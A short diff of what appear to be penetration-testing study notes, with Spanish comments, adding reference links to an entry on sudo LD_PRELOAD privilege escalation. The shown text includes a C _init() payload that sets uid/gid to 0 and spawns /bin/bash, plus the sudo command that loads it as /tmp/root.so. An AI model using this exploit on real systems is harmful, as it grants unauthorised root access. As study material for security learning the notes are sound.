@@ -377,7 +377,7 @@ Matching Defaults entries for user on this host:
 
 void _init() {
 unsetenv("LD_PRELOAD"); // esto se usa porque cuando se explota se usa esta misma entonces entra en un bucle infinito ver abajo y paginas
-setgid(0);
+setgid(0);// https://security.stackexchange.com/questions/205562/why-in-ld-preload-exploit-we-call-unsetenvld-preload
 setuid(0);
 system("/bin/bash");
 }
@@ -391,7 +391,7 @@ sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart
 
 here <COMMAND> mean which command have u allowed to do with sudo.
 
-
+https://unixhealthcheck.com/blog?id=363
 
 
 
